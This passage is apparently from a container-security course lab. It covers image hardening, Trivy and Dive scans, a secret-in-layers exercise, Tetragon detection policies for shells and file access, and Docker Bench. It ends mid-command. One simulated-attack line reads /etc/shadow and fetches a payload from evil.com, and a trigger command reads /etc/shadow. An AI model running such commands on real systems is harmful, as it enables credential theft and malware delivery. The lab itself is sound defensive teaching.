+<p><strong>Build an Alpine-based image:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">cat</span> &gt; myalpine.Dockerfile &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span>
+FROM alpine
+RUN apk add curl python3
+EOF
+docker build -t myalpine -f myalpine.Dockerfile .
+</div></code></pre>
+<p><strong>Compare image sizes and vulnerabilities:</strong></p>
+<pre class="hljs"><code><div>docker images | grep -E <span class="hljs-string">&quot;mypythonubuntu|myalpine&quot;</span>
+grype mypythonubuntu
+grype myalpine
+</div></code></pre>
+<h3 id="build-and-scan-a-deliberately-vulnerable-image">Build and scan a deliberately vulnerable image</h3>
+<p>Download the vulnerable Dockerfile:</p>
+<pre class="hljs"><code><div>wget https://raw.githubusercontent.com/tsadimasteaching/efrei/refs/heads/main/vuln.Dockerfile
+</div></code></pre>
+<p>This image intentionally includes: running as root, SUID binaries, hardcoded secrets, and a demo attacker user.</p>
+<pre class="hljs"><code><div>docker build -t insecure-image -f vuln.Dockerfile .
+</div></code></pre>
+<p><strong>Scan with Trivy (vulnerabilities, misconfigurations, and secrets):</strong></p>
+<pre class="hljs"><code><div>trivy image --security-checks vuln,config,secret insecure-image
+</div></code></pre>
+<h3 id="apply-security-rules-to-a-real-application">Apply security rules to a real application</h3>
+<p>Clone the FastAPI application:</p>
+<pre class="hljs"><code><div>git <span class="hljs-built_in">clone</span> https://github.com/tsadimasteaching/fastapi-intro.git
+<span class="hljs-built_in">cd</span> fastapi-intro
+</div></code></pre>
+<p><strong>Build and scan the unhardened image:</strong></p>
+<pre class="hljs"><code><div>docker build -f no-rules.Dockerfile -t fastapi.Dockerfile .
+trivy image --security-checks vuln,config,secret no-rules
+<span class="hljs-comment"># or you can get the count of findings for each category</span>
+trivy image --scanners vuln,config,secret --format json no-rules | \
+jq <span class="hljs-string">&#x27;.Results[]? | .Vulnerabilities[]?, .Misconfigurations[]?, .Secrets[]? | .Severity&#x27;</span> | \
+<span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c
+</div></code></pre>
+<p><strong>Apply the full set of security rules:</strong></p>
+<ol>
+<li>Use minimal base images (Alpine)</li>
+<li>Pin image versions</li>
+<li>Run as non-root user</li>
+<li>Use multi-stage builds</li>
+<li>Use <code>.dockerignore</code></li>
+<li>Avoid hardcoding secrets</li>
+<li>Set proper file permissions</li>
+<li>Enable read-only filesystem</li>
+<li>Drop all capabilities</li>
+</ol>
+<p><strong>Build and scan the hardened image:</strong></p>
+<p>Download the improved Dockerfile:</p>
+<pre class="hljs"><code><div>wget https://raw.githubusercontent.com/tsadimasteaching/fastapi-intro/refs/heads/main/fastapi-improved-updated.Dockerfile
+</div></code></pre>
+<p>This improved Dockerfile uses:</p>
+<ul>
+<li>Multi-stage build (builder + final)</li>
+<li><code>python:3.11-alpine</code> as base</li>
+<li>Non-root <code>appuser</code></li>
+<li>Minimal installed packages</li>
+</ul>
+<pre class="hljs"><code><div>docker build -f fastapi-improved-updated.Dockerfile -t fastapi-secure .
+trivy image --security-checks vuln,config,secret fastapi-secure
+</div></code></pre>
+<p><strong>Compare the results</strong> between <code>no-rules</code> and <code>fastapi-secure</code>.</p>
+<h3 id="inspect-image-layers-with-dive">Inspect image layers with Dive</h3>
+<pre class="hljs"><code><div>dive insecure-image
+</div></code></pre>
+<p>Look for:</p>
+<ul>
+<li>Secrets or credentials baked into layers</li>
+<li>Unnecessarily large layers</li>
+<li>Files that should have been excluded via <code>.dockerignore</code></li>
+</ul>
+<h3 id="exercise-prove-that-deleting-isnt-removing-in-overlayfs">Exercise: Prove that &quot;deleting isn't removing&quot; in OverlayFS</h3>
+<p>This exercise demonstrates that deleting a file in a later Dockerfile layer does <strong>not</strong> remove it from the image -- it only hides it behind a whiteout marker. The secret persists in the earlier layer.</p>
+<p><strong>1. Build an image that adds then &quot;deletes&quot; a secret:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">cat</span> &gt; secret-leak.Dockerfile &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span>
+FROM alpine:3.20
+
+<span class="hljs-comment"># Layer 1: create a secret file</span>
+RUN <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;DB_PASSWORD=SuperSecret123!&quot;</span> &gt; /tmp/credentials.txt
+
+<span class="hljs-comment"># Layer 2: &quot;delete&quot; the secret (students expect this to remove it)</span>
+RUN <span class="hljs-built_in">rm</span> /tmp/credentials.txt
+
+CMD [<span class="hljs-string">&quot;echo&quot;</span>, <span class="hljs-string">&quot;No secrets here... or are there?&quot;</span>]
+EOF
+
+docker build -t secret-leak -f secret-leak.Dockerfile .
+</div></code></pre>
+<p><strong>2. Verify the file is gone at runtime:</strong></p>
+<pre class="hljs"><code><div>docker run --<span class="hljs-built_in">rm</span> secret-leak <span class="hljs-built_in">cat</span> /tmp/credentials.txt
+<span class="hljs-comment"># cat: can&#x27;t open &#x27;/tmp/credentials.txt&#x27;: No such file or directory</span>
+</div></code></pre>
+<p>The file appears deleted. But is it really gone?</p>
+<p><strong>3. Use <code>docker history</code> to inspect the layers:</strong></p>
+<pre class="hljs"><code><div>docker <span class="hljs-built_in">history</span> secret-leak
+</div></code></pre>
+<p>Notice that the <code>RUN echo &quot;DB_PASSWORD=...&quot;</code> layer is still listed with a non-zero size -- the data is still there.</p>
+<p><strong>4. Use Dive to find the secret in the earlier layer:</strong></p>
+<pre class="hljs"><code><div>dive secret-leak
+</div></code></pre>
+<p>Navigate to the layer created by <code>RUN echo &quot;DB_PASSWORD=...&quot;</code>. You'll see <code>/tmp/credentials.txt</code> still exists in that layer. The <code>RUN rm</code> layer only added a whiteout marker.</p>
+<p><strong>5. Extract the secret directly from the image layers:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-comment"># Save the image as a tar archive</span>
+docker save secret-leak -o secret-leak.tar
+<span class="hljs-built_in">mkdir</span> secret-leak-layers &amp;&amp; tar xf secret-leak.tar -C secret-leak-layers
+
+<span class="hljs-comment"># Search every layer for the secret</span>
+grep -r <span class="hljs-string">&quot;SuperSecret123&quot;</span> secret-leak-layers/
+</div></code></pre>
+<p>The secret is found in one of the layer tarballs -- proving that <code>rm</code> in a later layer does not erase data from earlier layers.</p>
+<p><strong>Takeaway:</strong> Never put secrets in any Dockerfile layer, even temporarily. Use multi-stage builds, build-time secrets (<code>--mount=type=secret</code>), or external secret stores instead.</p>
+<hr>
+<h2 id="part-5-security-tools">Part 5: Security Tools</h2>
+<h3 id="ebpf-extended-berkeley-packet-filter">eBPF (Extended Berkeley Packet Filter)</h3>
+<p><strong>eBPF</strong> is a technology that allows running sandboxed programs directly inside the Linux kernel — without modifying kernel source code or loading kernel modules. Originally designed for network packet filtering (BPF, 1992), it has evolved into a general-purpose in-kernel virtual machine used for security, observability, and networking.</p>
+<p><strong>How eBPF works:</strong></p>
+<ol>
+<li>A user-space program writes an eBPF program (usually in C or using libraries like libbpf)</li>
+<li>The program is compiled to eBPF bytecode</li>
+<li>The kernel <strong>verifier</strong> checks the bytecode for safety (no infinite loops, no invalid memory access, bounded execution)</li>
+<li>If verified, the program is JIT-compiled to native machine code and attached to a <strong>hook point</strong> in the kernel</li>
+<li>Every time the hook fires (e.g., a syscall, a network packet, a file open), the eBPF program runs and can collect data or make decisions</li>
+</ol>
+<p><strong>eBPF hook points relevant to security:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Hook type</th>
+<th>What it monitors</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>kprobes</strong></td>
+<td>Any kernel function entry/exit</td>
+<td><code>security_file_open</code>, <code>security_bprm_check</code></td>
+</tr>
+<tr>
+<td><strong>tracepoints</strong></td>
+<td>Predefined stable kernel events</td>
+<td><code>sched:sched_process_exec</code>, <code>syscalls:sys_enter_open</code></td>
+</tr>
+<tr>
+<td><strong>LSM hooks</strong></td>
+<td>Linux Security Module decisions</td>
+<td>File access, capability checks, task creation</td>
+</tr>
+<tr>
+<td><strong>XDP</strong></td>
+<td>Network packets at the driver level</td>
+<td>Packet filtering before the kernel network stack</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Why eBPF matters for container security:</strong></p>
+<ul>
+<li><strong>No kernel modules</strong> — unlike older tools that need to compile and load <code>.ko</code> files for each kernel version, eBPF programs are portable via BTF (BPF Type Format) and CO-RE (Compile Once – Run Everywhere)</li>
+<li><strong>Low overhead</strong> — eBPF programs run in kernel space, avoiding costly context switches between kernel and user space</li>
+<li><strong>Safety guaranteed</strong> — the verifier ensures eBPF programs cannot crash the kernel, access arbitrary memory, or run forever</li>
+<li><strong>Real-time visibility</strong> — observe every process execution, file access, network connection, and privilege change as it happens</li>
+</ul>
+<p><strong>eBPF security tools ecosystem:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Maintainer</th>
+<th>Focus</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Tetragon</strong></td>
+<td>Cilium / Isovalent (CNCF)</td>
+<td>Runtime security enforcement and observability using kprobes and LSM hooks</td>
+</tr>
+<tr>
+<td><strong>Falco</strong></td>
+<td>Sysdig (CNCF)</td>
+<td>Rule-based runtime threat detection with a large community rule library</td>
+</tr>
+<tr>
+<td><strong>Tracee</strong></td>
+<td>Aqua Security</td>
+<td>Runtime security and forensics with event tracing</td>
+</tr>
+<tr>
+<td><strong>Cilium</strong></td>
+<td>Isovalent (CNCF)</td>
+<td>eBPF-based networking, load balancing, and network policy for Kubernetes</td>
+</tr>
+</tbody>
+</table>
+<h3 id="tetragon">Tetragon</h3>
+<p><strong>Tetragon</strong> is a CNCF runtime security tool that uses eBPF to monitor and enforce security policies at the kernel level. It was created by Isovalent (the company behind Cilium) and open-sourced in 2022.</p>
+<p><strong>Key concepts:</strong></p>
+<ul>
+<li><strong>Process lifecycle tracking</strong> — Tetragon hooks into the kernel's process execution path to track every process start and exit, including full process ancestry (parent → child chains)</li>
+<li><strong>TracingPolicy</strong> — a Kubernetes CRD (or standalone YAML) that defines which kernel events to monitor. You specify a kernel function (kprobe), the arguments to capture, and selectors to filter events</li>
+<li><strong>Selectors</strong> — filter events by argument values (<code>Prefix</code>, <code>Postfix</code>, <code>Equal</code>), by namespace (<code>matchNamespaces</code> to target only containers), or by capabilities and binary paths</li>
+<li><strong>Actions</strong> — what to do when a policy matches: <code>Post</code> (report), <code>Sigkill</code> (kill the process), <code>Override</code> (change the return value)</li>
+</ul>
+<p><strong>Tetragon architecture:</strong></p>
+<pre class="hljs"><code><div>┌─────────────────────────────────────────┐
+│              User Space                  │
+│  ┌──────────┐  ┌──────────────────────┐ │
+│  │  tetra   │  │  tetragon daemon     │ │
+│  │  (CLI)   │──│  - loads policies    │ │
+│  │          │  │  - exports events    │ │
+│  └──────────┘  │  - gRPC API          │ │
+│                └──────────┬───────────┘ │
+├───────────────────────────┼─────────────┤
+│              Kernel Space │             │
+│  ┌────────────────────────▼──────────┐  │
+│  │         eBPF Programs             │  │
+│  │  - kprobes on kernel functions    │  │
+│  │  - process execution tracking     │  │
+│  │  - file access monitoring         │  │
+│  │  - network observability          │  │
+│  └───────────────────────────────────┘  │
+└─────────────────────────────────────────┘
+</div></code></pre>
+<p><strong>What Tetragon can detect:</strong></p>
+<ul>
+<li>Process execution inside containers (shell spawning, unexpected binaries)</li>
+<li>Sensitive file access (<code>/etc/shadow</code>, <code>/etc/passwd</code>, private keys)</li>
+<li>Network connections to suspicious destinations</li>
+<li>Privilege escalation (capability changes, setuid usage)</li>
+<li>Kernel module loading</li>
+</ul>
+<p><strong>Tetragon vs Falco:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Feature</th>
+<th>Tetragon</th>
+<th>Falco</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Technology</strong></td>
+<td>Pure eBPF (kprobes, LSM hooks)</td>
+<td>eBPF or kernel module</td>
+</tr>
+<tr>
+<td><strong>Policy format</strong></td>
+<td>TracingPolicy YAML (CRDs in K8s)</td>
+<td>Rules in YAML with Falco syntax</td>
+</tr>
+<tr>
+<td><strong>Enforcement</strong></td>
+<td>Can kill processes (<code>Sigkill</code> action)</td>
+<td>Detection only (alerts)</td>
+</tr>
+<tr>
+<td><strong>Overhead</strong></td>
+<td>Very low (in-kernel filtering)</td>
+<td>Low to moderate</td>
+</tr>
+<tr>
+<td><strong>Community rules</strong></td>
+<td>Smaller but growing</td>
+<td>Large library of community rules</td>
+</tr>
+<tr>
+<td><strong>Kubernetes</strong></td>
+<td>Native CRD integration via Helm</td>
+<td>Supports K8s via Falcosidekick</td>
+</tr>
+<tr>
+<td><strong>Portability</strong></td>
+<td>Needs BTF-enabled kernel (5.8+)</td>
+<td>Broader kernel support</td>
+</tr>
+</tbody>
+</table>
+<h3 id="explore-tetragon">Explore Tetragon</h3>
+<p>Tetragon is an eBPF-based runtime security tool by Cilium/Isovalent. Unlike Falco (which requires kernel modules or large BPF programs), Tetragon uses modern eBPF directly — no kernel module compilation needed. It monitors process execution, file access, and network activity in real time.</p>
+<p><strong>1. Run Tetragon as a container:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> docker run -d --name tetragon --<span class="hljs-built_in">rm</span> \
+  --pid=host --cgroupns=host \
+  --privileged \
+  -v /sys/kernel/btf/vmlinux:/var/run/tetragon/btf \
+  -v /sys/fs/cgroup:/sys/fs/cgroup \
+  -v /sys/kernel/tracing:/sys/kernel/tracing \
+  -v /sys/kernel/debug:/sys/kernel/debug \
+  quay.io/cilium/tetragon:v1.3.0
+</div></code></pre>
+<p><strong>2. Observe events in real time:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> docker <span class="hljs-built_in">exec</span> tetragon tetra getevents -o compact
+</div></code></pre>
+<p>You'll see all process starts (<code>🚀 process</code>) and exits (<code>💥 exit</code>) across the system. Open another terminal and run any command — it will appear in the Tetragon output immediately.</p>
+<p><strong>3. Trigger a specific event:</strong></p>
+<p>In another terminal:</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cat</span> /etc/shadow
+</div></code></pre>
+<p>Back in the Tetragon output, you'll see:</p>
+<pre class="hljs"><code><div>🚀 process  /usr/bin/cat /etc/shadow
+💥 exit     /usr/bin/cat /etc/shadow 0
+</div></code></pre>
+<p>Press <code>Ctrl+C</code> to stop watching events.</p>
+<p><strong>4. Stop Tetragon:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> docker stop tetragon
+</div></code></pre>
+<h3 id="create-custom-tracing-policies">Create custom tracing policies</h3>
+<p>Tetragon uses <strong>TracingPolicy</strong> YAML files to define what kernel events to monitor. Policies hook into kernel functions (kprobes) and filter by arguments.</p>
+<p><strong>1. Write below <code>/etc</code> policy:</strong></p>
+<p>Create <code>write-etc-policy.yaml</code>:</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">cat</span> &gt; write-etc-policy.yaml &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span>
+apiVersion: cilium.io/v1alpha1
+kind: TracingPolicy
+metadata:
+  name: write-etc
+spec:
+  kprobes:
+  - call: <span class="hljs-string">&quot;security_file_open&quot;</span>
+    syscall: <span class="hljs-literal">false</span>
+    args:
+    - index: 0
+      <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;file&quot;</span>
+    selectors:
+    - matchArgs:
+      - index: 0
+        operator: <span class="hljs-string">&quot;Prefix&quot;</span>
+        values:
+        - <span class="hljs-string">&quot;/etc&quot;</span>
+      matchActions:
+      - action: Post
+EOF
+</div></code></pre>
+<p><strong>Understanding the policy:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>kprobes</code></td>
+<td>Hook into kernel function calls</td>
+</tr>
+<tr>
+<td><code>call: &quot;security_file_open&quot;</code></td>
+<td>The LSM hook called when any file is opened</td>
+</tr>
+<tr>
+<td><code>args[0].type: &quot;file&quot;</code></td>
+<td>Capture the file path argument</td>
+</tr>
+<tr>
+<td><code>matchArgs[0].operator: &quot;Prefix&quot;</code></td>
+<td>Only match files whose path starts with...</td>
+</tr>
+<tr>
+<td><code>values: [&quot;/etc&quot;]</code></td>
+<td>...the <code>/etc</code> directory</td>
+</tr>
+<tr>
+<td><code>matchActions: Post</code></td>
+<td>Report the event after it happens</td>
+</tr>
+</tbody>
+</table>
+<p><strong>2. Run Tetragon with the policy:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> docker run -d --name tetragon --<span class="hljs-built_in">rm</span> \
+  --pid=host --cgroupns=host \
+  --privileged \
+  -v /sys/kernel/btf/vmlinux:/var/run/tetragon/btf \
+  -v /sys/fs/cgroup:/sys/fs/cgroup \
+  -v /sys/kernel/tracing:/sys/kernel/tracing \
+  -v /sys/kernel/debug:/sys/kernel/debug \
+  -v $(<span class="hljs-built_in">pwd</span>)/write-etc-policy.yaml:/etc/tetragon/tetragon.tp.d/write-etc-policy.yaml \
+  quay.io/cilium/tetragon:v1.3.0
+</div></code></pre>
+<p><strong>3. Watch for events and trigger:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> docker <span class="hljs-built_in">exec</span> tetragon tetra getevents -o compact
+</div></code></pre>
+<p>In another terminal, write to <code>/etc</code>:</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">touch</span> /etc/test_file_tetragon
+</div></code></pre>
+<p>You'll see Tetragon report the file open event on <code>/etc/test_file_tetragon</code>.</p>
+<p><strong>4. Stop Tetragon:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> docker stop tetragon
+</div></code></pre>
+<h3 id="detect-shell-spawned-in-containers">Detect shell spawned in containers</h3>
+<p><strong>1. Create a shell detection policy:</strong></p>
+<p>Create <code>container-shell-detect-policy.yaml</code>:</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">cat</span> &gt; container-shell-detect-policy.yaml &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span>
+apiVersion: cilium.io/v1alpha1
+kind: TracingPolicy
+metadata:
+  name: shell-in-container
+spec:
+  kprobes:
+  - call: <span class="hljs-string">&quot;security_bprm_check&quot;</span>
+    syscall: <span class="hljs-literal">false</span>
+    args:
+    - index: 0
+      <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;linux_binprm&quot;</span>
+    selectors:
+    - matchArgs:
+      - index: 0
+        operator: <span class="hljs-string">&quot;Postfix&quot;</span>
+        values:
+        - <span class="hljs-string">&quot;/bash&quot;</span>
+        - <span class="hljs-string">&quot;/sh&quot;</span>
+        - <span class="hljs-string">&quot;/zsh&quot;</span>
+        - <span class="hljs-string">&quot;/ash&quot;</span>
+      matchNamespaces:
+      - namespace: Pid
+        operator: NotIn
+        values:
+        - <span class="hljs-string">&quot;host_ns&quot;</span>
+      matchActions:
+      - action: Post
+EOF
+</div></code></pre>
+<p><strong>Understanding the policy:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>call: &quot;security_bprm_check&quot;</code></td>
+<td>LSM hook called when a binary is about to execute</td>
+</tr>
+<tr>
+<td><code>args[0].type: &quot;linux_binprm&quot;</code></td>
+<td>Capture the binary path</td>
+</tr>
+<tr>
+<td><code>matchArgs: Postfix</code></td>
+<td>Match binaries ending in <code>/bash</code>, <code>/sh</code>, <code>/zsh</code>, <code>/ash</code></td>
+</tr>
+<tr>
+<td><code>matchNamespaces: Pid NotIn host_ns</code></td>
+<td>Only match processes in a <strong>non-host</strong> PID namespace (i.e., inside containers)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>2. Run Tetragon with the shell detection policy:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> docker run -d --name tetragon --<span class="hljs-built_in">rm</span> \
+  --pid=host --cgroupns=host \
+  --privileged \
+  -v /sys/kernel/btf/vmlinux:/var/run/tetragon/btf \
+  -v /sys/fs/cgroup:/sys/fs/cgroup \
+  -v /sys/kernel/tracing:/sys/kernel/tracing \
+  -v /sys/kernel/debug:/sys/kernel/debug \
+  -v $(<span class="hljs-built_in">pwd</span>)/container-shell-detect-policy.yaml:/etc/tetragon/tetragon.tp.d/container-shell-detect-policy.yaml \
+  quay.io/cilium/tetragon:v1.3.0
+</div></code></pre>
+<p><strong>3. Watch for events:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> docker <span class="hljs-built_in">exec</span> tetragon tetra getevents -o compact
+</div></code></pre>
+<p><strong>4. Trigger the alert:</strong></p>
+<p>In another terminal:</p>
+<pre class="hljs"><code><div>docker run --<span class="hljs-built_in">rm</span> -it alpine sh
+</div></code></pre>
+<p>Tetragon will show the shell execution event from inside the container's PID namespace.</p>
+<p><strong>5. Stop Tetragon:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> docker stop tetragon
+</div></code></pre>
+<h3 id="full-circle-detect-the-part-2-attacks-with-tetragon">Full-circle: Detect the Part 2 attacks with Tetragon</h3>
+<p>In Part 2 you performed attacks (privilege escalation, docker exec into containers, docker socket abuse). Now create a Tetragon policy that would have detected them -- closing the loop between attack and defense.</p>
+<p><strong>1. Create a policy that detects <code>docker exec</code> into any container:</strong></p>
+<p>When an attacker runs <code>docker exec -it &lt;container&gt; sh</code>, the runc binary spawns a new process inside the container's PID namespace. This policy catches exactly that pattern:</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">cat</span> &gt; detect-exec-policy.yaml &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span>
+apiVersion: cilium.io/v1alpha1
+kind: TracingPolicy
+metadata:
+  name: detect-container-exec
+spec:
+  kprobes:
+  - call: <span class="hljs-string">&quot;security_bprm_check&quot;</span>
+    syscall: <span class="hljs-literal">false</span>
+    args:
+    - index: 0
+      <span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;linux_binprm&quot;</span>
+    selectors:
+    <span class="hljs-comment"># Match any binary execution inside a container (non-host PID namespace)</span>
+    - matchNamespaces:
+      - namespace: Pid
+        operator: NotIn
+        values:
+        - <span class="hljs-string">&quot;host_ns&quot;</span>
+      matchActions:
+      - action: Post
+EOF
+</div></code></pre>
+<p><strong>Understanding:</strong> Unlike the shell-detection policy (which only matches <code>/sh</code>, <code>/bash</code>, etc.), this policy catches <strong>any</strong> binary execution inside a container -- including an attacker running <code>curl</code>, <code>wget</code>, <code>python</code>, or compiled exploits.</p>
+<p><strong>2. Run Tetragon with the policy:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> docker run -d --name tetragon --<span class="hljs-built_in">rm</span> \
+  --pid=host --cgroupns=host \
+  --privileged \
+  -v /sys/kernel/btf/vmlinux:/var/run/tetragon/btf \
+  -v /sys/fs/cgroup:/sys/fs/cgroup \
+  -v /sys/kernel/tracing:/sys/kernel/tracing \
+  -v /sys/kernel/debug:/sys/kernel/debug \
+  -v $(<span class="hljs-built_in">pwd</span>)/detect-exec-policy.yaml:/etc/tetragon/tetragon.tp.d/detect-exec-policy.yaml \
+  quay.io/cilium/tetragon:v1.3.0
+</div></code></pre>
+<p><strong>3. Watch events and replay the Part 2 attack:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-comment"># Terminal 1: watch Tetragon</span>
+<span class="hljs-built_in">sudo</span> docker <span class="hljs-built_in">exec</span> tetragon tetra getevents -o compact
+
+<span class="hljs-comment"># Terminal 2: start a target container</span>
+docker run -d --name victim alpine <span class="hljs-built_in">sleep</span> 300
+
+<span class="hljs-comment"># Terminal 3: simulate the attacker from Part 2</span>
+docker <span class="hljs-built_in">exec</span> -it victim sh -c <span class="hljs-string">&quot;cat /etc/shadow; wget http://evil.com/payload&quot;</span>
+</div></code></pre>
+<p>Tetragon will report every binary execution (<code>sh</code>, <code>cat</code>, <code>wget</code>) inside the <code>victim</code> container -- the same attack you performed in Part 2, now detected.</p>
+<p><strong>4. Discuss:</strong> How would you modify this policy to <strong>block</strong> the attack instead of just logging it? (Hint: change <code>action: Post</code> to <code>action: Sigkill</code>.)</p>
+<p><strong>5. Cleanup:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> docker stop tetragon
+docker stop victim
+</div></code></pre>
+<h3 id="exercise-monitor-a-real-application-with-tetragon">Exercise: Monitor a real application with Tetragon</h3>
+<p>Check and run the Budibase docker-compose:</p>
+<pre class="hljs"><code><div>wget https://raw.githubusercontent.com/Budibase/budibase/master/hosting/docker-compose.yaml
+docker compose up -d
+</div></code></pre>
+<p>Run Tetragon and observe the output:</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> docker run -d --name tetragon --<span class="hljs-built_in">rm</span> \
+  --pid=host --cgroupns=host \
+  --privileged \
+  -v /sys/kernel/btf/vmlinux:/var/run/tetragon/btf \
+  -v /sys/fs/cgroup:/sys/fs/cgroup \
+  -v /sys/kernel/tracing:/sys/kernel/tracing \
+  -v /sys/kernel/debug:/sys/kernel/debug \
+  quay.io/cilium/tetragon:v1.3.0
+
+<span class="hljs-built_in">sudo</span> docker <span class="hljs-built_in">exec</span> tetragon tetra getevents -o compact
+</div></code></pre>
+<p>You'll see all process execution events across the Budibase containers. Look for suspicious patterns like:</p>
+<ul>
+<li>Shells being spawned inside application containers</li>
+<li>Unexpected binaries executing</li>
+<li>Network-related processes starting</li>
+</ul>
+<blockquote>
+<p><strong>Tetragon vs Falco:</strong> Tetragon uses pure eBPF (no kernel modules), has lower overhead, and integrates natively with Kubernetes via CRDs. Falco has a larger rule library and more community rules. Both are excellent for runtime security monitoring.</p>
+</blockquote>
+<h3 id="docker-bench-for-security">Docker Bench for Security</h3>
+<p>Docker Bench for Security is an official script from Docker that checks your host and Docker daemon configuration against the CIS (Center for Internet Security) Docker Benchmark. It audits dozens of best practices in one command — a quick way to find misconfigurations.</p>
+<p><strong>1. Run Docker Bench:</strong></p>
+<pre class="hljs"><code><div>docker run --<span class="hljs-built_in">rm</span> --net host --pid host \
+  -v /var/run/docker.sock:/var/run/docker.sock \
+  -v /etc:/etc:ro \
+  -v /usr/lib/systemd:/usr/lib/systemd:ro \
+  -v /etc/docker:/etc/docker:ro \
+  docker/docker-bench-security
+</div></code></pre>
+<p><strong>2. Understand the output:</strong></p>
+<p>The script checks categories based on the CIS Docker Benchmark:</p>
+<table>
+<thead>
+<tr>
+<th>Section</th>
+<th>What it checks</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>1 - Host Configuration</strong></td>
+<td>Kernel parameters, audit rules, Docker partition</td>
+</tr>
+<tr>
+<td><strong>2 - Docker Daemon</strong></td>
+<td>TLS, logging, ulimits, live restore, userland proxy</td>
+</tr>
+<tr>
+<td><strong>3 - Docker Files</strong></td>
+<td>File permissions on Docker socket, config files, certificates</td>
+</tr>
+<tr>
+<td><strong>4 - Container Images</strong></td>
+<td>Root user, HEALTHCHECK, content trust</td>
+</tr>
+<tr>
+<td><strong>5 - Container Runtime</strong></td>
+<td>Privileged mode, capabilities, read-only fs, PID limits, resource constraints</td>
+</tr>
+<tr>
+<td><strong>7 - Docker Swarm</strong></td>
+<td>Swarm mode security settings</td>
+</tr>
+</tbody>
+</table>
+<p>Each check is marked as:</p>
+<ul>
+<li><code>[PASS]</code> — configuration follows the recommendation</li>
+<li><code>[WARN]</code> — potential security issue found</li>
+<li><code>[INFO]</code> — informational finding</li>
+<li><code>[NOTE]</code> — manual verification needed</li>
+</ul>
+<p><strong>3. Test with a running container:</strong></p>
+<p>Start an insecure container, then re-run the benchmark:</p>
+<pre class="hljs"><code><div>docker run -d --name insecure --privileged debian <span class="hljs-built_in">sleep</span> 300
+docker run --<span class="hljs-built_in">rm</span> --net host --pid host \
+  -v /var/run/docker.sock:/var/run/docker.sock \
+  -v /etc:/etc:ro \
+  -v /usr/lib/systemd:/usr/lib/systemd:ro \
+  -v /etc/docker:/etc/docker:ro \
+  docker/docker-bench-security
+</div></code></pre>
+<p>Look for warnings in <strong>Section 5</strong> about the <code>insecure</code> container — it will flag the <code>--privileged</code> flag, missing resource limits, and more.</p>
+<p><strong>4. Cleanup:</strong></p>
+<pre class="hljs"><code><div>docker stop insecure &amp;&amp; docker <span class="hljs-built_in">rm</span> insecure
+</div></code></pre>
+<blockquote>
+<p><strong>Tip:</strong> Run Docker Bench regularly in CI/CD or as a cron job. Pipe the output to a file (<code>&gt; bench-results.txt</code>) and track improvements over time.</p>
+</blockquote>
+<hr>
+<h2 id="part-6-sandboxing">Part 6: Sandboxing</h2>
+<h3 id="rootless-docker">Rootless Docker</h3>
+<p>Run the Docker daemon as a normal user to prevent host root compromise.</p>
+<p><strong>1. Install Docker (if not already installed):</strong></p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> apt-get install ca-certificates curl
+<span class="hljs-built_in">sudo</span> install -m 0755 -d /etc/apt/keyrings
+<span class="hljs-built_in">sudo</span> curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
+<span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chmod</span> a+r /etc/apt/keyrings/docker.asc
+
+<span class="hljs-built_in">echo</span> \
+  <span class="hljs-string">&quot;deb [arch=<span class="hljs-subst">$(dpkg --print-architecture)</span> signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \
+  <span class="hljs-subst">$(. /etc/os-release &amp;&amp; echo <span class="hljs-string">&quot;<span class="hljs-variable">${UBUNTU_CODENAME:-<span class="hljs-variable">$VERSION_CODENAME</span>}</span>&quot;</span>)</span> stable&quot;</span> | \
